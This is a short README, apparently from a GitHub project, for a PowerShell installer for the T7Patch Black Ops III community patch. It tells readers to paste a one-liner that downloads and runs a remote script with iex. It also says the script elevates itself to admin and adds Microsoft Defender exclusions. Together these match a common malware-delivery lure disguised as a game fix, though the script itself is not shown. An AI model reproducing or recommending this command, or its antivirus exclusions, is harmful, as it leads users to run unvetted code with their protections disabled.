# 🧩 T7Patch PowerShell Installer

**install-t7patch.ps1** is a simple one-click PowerShell installer for **T7Patch** — a popular community patch for *Call of Duty: Black Ops III*.

This script automatically:
- Downloads the latest **T7Patch** release ZIP  
- Extracts it to your **Desktop** (`%UserProfile%\Desktop\T7Patch`)  
- Creates a **desktop shortcut** to launch `t7patch_2.04.exe`  
- Adds **Microsoft Defender exclusions** for the folder and executable  
- Cleans up temporary files when finished  

---

## ⚙️ Features
✅ Automatic download and extraction  
✅ Desktop shortcut creation  
✅ Defender exclusions for smoother use  
✅ Automatic admin elevation  
✅ Cleanup of temp files  

---

## ▶️ Installation

### Option 1 — Quick (runs directly in PowerShell)
Open **PowerShell** and paste this command:

```powershell
iex (iwr 'https://raw.githubusercontent.com/babyonyt/t7patch-installer/main/install-t7patch.ps1' -UseBasicParsing).Content
